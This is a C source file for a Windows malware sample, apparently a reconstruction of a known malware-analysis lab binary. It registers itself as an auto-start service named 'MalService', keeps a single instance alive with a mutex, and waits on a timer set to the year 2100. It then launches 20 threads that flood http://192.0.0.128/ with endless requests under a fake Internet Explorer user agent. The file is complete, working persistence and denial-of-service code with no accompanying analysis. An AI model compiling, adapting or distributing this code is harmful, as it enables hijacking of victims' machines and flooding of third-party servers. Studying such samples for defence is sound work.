#include <Windows.h>
#include <stdio.h>
#include <wininet.h>

#pragma warning( disable : 6031 )
#pragma warning( disable : 6387 )
#pragma comment(lib, "Wininet.lib")

#define MUTEX_NAME "HGL345"
#define DISPLAY_NAME "MalService"

int ServiceMain(int x, int y);
void StartAddress(void);


int main(void)
{
	SERVICE_TABLE_ENTRYA ServiceTable[] = {
		{DISPLAY_NAME, (LPSERVICE_MAIN_FUNCTIONA)ServiceMain},
		{NULL, NULL}
	};

	StartServiceCtrlDispatcherA(ServiceTable);

	return ServiceMain(0, 0);
}


int ServiceMain(int x, int y)
{
	SC_HANDLE scm;
	CHAR filename[1000] = { '\0' };
	SYSTEMTIME systime;
	struct _FILETIME filetime;
	HANDLE WaitableTimer;

	if (OpenMutexA(MUTEX_ALL_ACCESS, 0, MUTEX_NAME) != NULL)
		ExitProcess(0);

	CreateMutexA(0, 0, MUTEX_NAME);

	scm = OpenSCManagerA(NULL, NULL, (SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT));

	GetModuleFileNameA(NULL, filename, 1000);

	CreateServiceA(scm, DISPLAY_NAME, DISPLAY_NAME, SC_MANAGER_CREATE_SERVICE, SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, filename, NULL, NULL, NULL, NULL, NULL);

	memset(&systime.wMonth, 0, 14);
	systime.wYear = 2100;
	SystemTimeToFileTime(&systime, &filetime);
	WaitableTimer = CreateWaitableTimerA(NULL, TRUE, NULL);
	SetWaitableTimer(WaitableTimer, (const PLARGE_INTEGER)&filetime, 0, 0, 0, TRUE);

	if (WaitForSingleObject(WaitableTimer, INFINITE))
		return 0;

	int count_down = 20;
	do
	{
		// printf_s("%d\n", count_down);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartAddress, NULL, NULL, 0);
		--count_down;
	} while (count_down);


	// printf_s("Success: %s\n", filename);

	return 0;
}


void StartAddress(void)
{
	HINTERNET i;

	for (i = InternetOpenA("Internet Explorer 8.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0); ; InternetOpenUrlA(i, "http://192.0.0.128/", NULL, 0, INTERNET_FLAG_RELOAD, NULL))
		;
}